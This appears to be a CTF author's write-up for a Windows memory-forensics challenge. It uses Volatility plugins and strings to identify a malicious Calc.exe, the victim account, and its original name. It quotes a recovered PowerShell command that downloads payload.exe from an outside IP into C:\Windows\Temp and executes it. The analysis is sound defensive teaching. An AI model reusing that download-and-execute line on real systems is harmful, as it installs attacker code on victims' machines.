# writer writeup 
1. For the malicious process PID you can figure it out after analyzing the memory a bit by using windows.pslist and windows.pstree with volatility3, volatility 2 also works. You would see that the Calc.exe process PPID is cmd.exe so its the first suspicious point, also the path of calc.exe is in C:\Windows\Temp\Calc.exe which is very suspicious, and if you dump the file and throw it in virusTotal you would get 40+ antivirus engines saying its malicious. So Calc.exe is the malicious process with the PID 2576.
2. For the victim's user account you can find it using the windows.sessions plugin in volatility 3.
3. For the original name of the malicious process you can find it by multiple steps, since there are powershell commands and cmd commands maybe try and checkout if there any connections coming from outside. Use the plugin windows.netstat in volaitlity3 you would see powershell.exe with a suspicious ip 3.79.237.40. Now we try to find activity related to the IP, there are many ways to do so, but we can go with most basic way our old friend strings. the following command would show a lot of activity related to the IP:
```strings ElPablo.vmem| grep -iE "3.79.237.40"```
Its not a huge output and you would find this line in one of them:
```"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iwr http://3.79.237.40/payload.exe -OutFile C:\\Windows\Temp\\Calc.exe; C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\Temp\Calc.exe```
a summary of the line above:
The command uses PowerShell to download a malicious file (payload.exe) from an external URL and saves it as Calc.exe in the Temp directory. Then, it uses cmd.exe to execute the downloaded file.

Key Steps:
- PowerShell fetches the file from http://3.79.237.40/payload.exe using Invoke-WebRequest.
- Saves it to C:\Windows\Temp\Calc.exe.
- cmd.exe executes the saved file.

So for the original name it's payload.exe
